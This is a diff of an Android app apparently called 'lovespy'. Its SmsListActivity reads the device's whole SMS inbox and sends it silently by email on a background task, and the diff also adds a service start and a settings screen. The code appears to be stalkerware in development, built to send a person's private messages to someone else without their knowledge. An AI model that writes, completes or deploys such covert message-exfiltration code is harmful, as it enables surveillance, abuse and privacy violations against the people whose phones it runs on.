@@ -5,6 +5,7 @@ import android.content.Intent;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
+import android.preference.PreferenceManager;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.widget.ArrayAdapter;
@@ -19,28 +20,26 @@ import com.example.lovespy.app.sms.SmsReader;
 
 public class SmsListActivity extends Activity {
 
-    private static final Uri STATUS_URI = Uri.parse("content://sms");
     private String mLetter;
-    //private SmsSentObserver mSmsSentObserver;
+    private EmailHelper mEmailHelper;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.sms_list);
         SmsReader smsReader = new SmsReader(this);
+        mEmailHelper = new EmailHelper(this);
         mLetter = smsReader.getSmsList();
-        //mSmsSentObserver = new SmsSentObserver(new Handler(), this);
-        //getContentResolver().registerContentObserver(STATUS_URI, true, mSmsSentObserver);
         ListView listView = (ListView) findViewById(R.id.listView);
         String[] items = {mLetter};
         ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, items);
         listView.setAdapter(adapter);
+        PreferenceManager.setDefaultValues(this, R.xml.preferences, false);
     }
 
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        //getContentResolver().unregisterContentObserver(mSmsSentObserver);
     }
 
     @Override
@@ -59,15 +58,18 @@ public class SmsListActivity extends Activity {
                 new AsyncTask<Void,Void,Void>() {
                     @Override
                     protected Void doInBackground(Void... voids) {
-                        EmailHelper.sendEmailSilently(mLetter);
+                        mEmailHelper.sendEmailSilently(mLetter);
                         return null;
                     }
                 }.execute();
+                return true;
             case R.id.start_service:
                 startService();
+                return true;
             case R.id.settings:
                 Intent intent = new Intent(this, SettingsActivity.class);
                 startActivity(intent);
+                return true;
             default:
         }
         return super.onOptionsItemSelected(item);
